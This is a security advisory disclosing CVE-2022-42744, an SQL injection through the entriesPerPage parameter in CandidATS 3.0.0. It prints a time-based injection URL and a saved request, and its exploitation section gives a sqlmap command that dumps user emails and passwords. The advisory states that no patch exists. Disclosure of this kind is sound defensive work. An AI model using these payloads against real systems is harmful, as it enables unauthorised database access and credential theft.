---
slug: advisories/mohawke/
title: CandidATS 3.0.0 - SQLi via entriesPerPage
authors: Carlos Bello
writer: cbello
codename: mohawke
product: CandidATS 3.0.0 - SQLi via entriesPerPage
date: 2022-10-25 18:30 COT
cveid: CVE-2022-42744
severity: 8.8
description: CandidATS 3.0.0      -     SQLi via entriesPerPage
keywords: Fluid Attacks, Security, Vulnerabilities, Candid ATS, Sql Injection
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | CandidATS 3.0.0 - SQLi via entriesPerPage                          |
| **Code name**         | [Mohawke](https://en.wikipedia.org/wiki/Hudson_Mohawke)            |
| **Product**           | CandidATS                                                          |
| **Affected versions** | Version 3.0.0                                                      |
| **State**             | Public                                                             |
| **Release date**      | 2022-10-25                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | SQL injection                                                                                                               |
| **Rule**              | [146. SQL injection](https://docs.fluidattacks.com/criteria/vulnerabilities/146)                                            |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H                                                                                |
| **CVSSv3 Base Score** | 8.8                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2022-42744](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42744)                                             |

## Description

CandidATS version 3.0.0 allows an external attacker to perform CRUD
operations on the application databases. This is possible because the
application does not correctly validate the `entriesPerPage` parameter
against SQLi attacks.

## Vulnerability

The SQLi present in CandidATS 3.0.0 allows an unauthenticated remote
attacker to perform CRUD operations on the application database. To
trigger this vulnerability, we will need to send a malicious SQL query
in the `entriesPerPage` parameter.

* https://demo.candidats.net/ajax.php?f=getPipelineJobOrder&joborderID=50&page=0&entriesPerPage=15+AND+sleep(5)--+&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0

## Exploitation

In this attack we will obtain the logs containing the emails and passwords
of the users. To achieve this we will need 3 things:

### candidATS.req

The request of the application, we save it in a file.

```txt
GET /ajax.php?f=getPipelineJobOrder&joborderID=50&page=0&entriesPerPage=15&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0 HTTP/2
Host: demo.candidats.net
Cookie: CATS=1eiuqu2acq6t6tcguhcof52eha
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
```

### SqlMap Command

By executing this command, we will obtain the records of our interest.

```bash
sqlmap -r candidATS.req -p entriesPerPage -D prfkvqsyht -T user -C email,password --dump
```

### Dump DB

Finally we see how we managed to compromise user records.

![image](https://user-images.githubusercontent.com/51862990/197896631-7b6244a0-dc45-4816-a2e2-578d22d3ac31.png)

## Our security policy

We have reserved the CVE-2022-42744 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: CandidATS 3.0.0

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://candidats.net/>

## Timeline

<time-lapse
  discovered="2022-10-07"
  contacted="2022-10-07"
  replied="2022-10-07"
  confirmed="2022-10-07"
  patched=""
  disclosure="2022-10-25">
</time-lapse>
